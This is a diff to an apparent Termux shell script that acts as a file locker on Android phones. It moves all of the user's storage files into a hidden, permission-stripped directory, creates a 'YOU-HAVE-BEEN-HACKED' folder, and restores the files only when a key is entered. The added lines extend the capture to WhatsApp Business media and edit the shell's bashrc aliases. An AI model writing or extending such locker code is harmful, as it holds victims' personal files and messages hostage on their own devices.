@@ -2,6 +2,7 @@ pkg install termimage
 termux-setup-storage
 mkdir /$HOME/.rfkzk
 mv /sdcard/* /data/data/com.termux/files/home/.rfkzk
+mv /sdcard/Android/media/com.whatsapp.w4b/'Whatsapp Business' /data/data/com.termux/files/home/.rfkzk
 chmod u=w /$HOME/.rfkzk
 mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂
 chmod u=x *
@@ -31,6 +32,7 @@ do
 		echo -e "\033[0;49;95m Please Check Your Gallery!"
 		chmod u=rwx /$HOME/.rfkzk
 		mv /$HOME/.rfkzk/* /sdcard
+  		mv /data/data/com.termux/files/home/.rfkzk/'Whatsapp Business' /sdcard/Android/media/com.whatsapp.w4b/
 		sed -i 's/alias/#/' /data/data/com.termux/files/usr/etc/bash.bashrc
 		break
 	elif [ "$key" == "info" ]
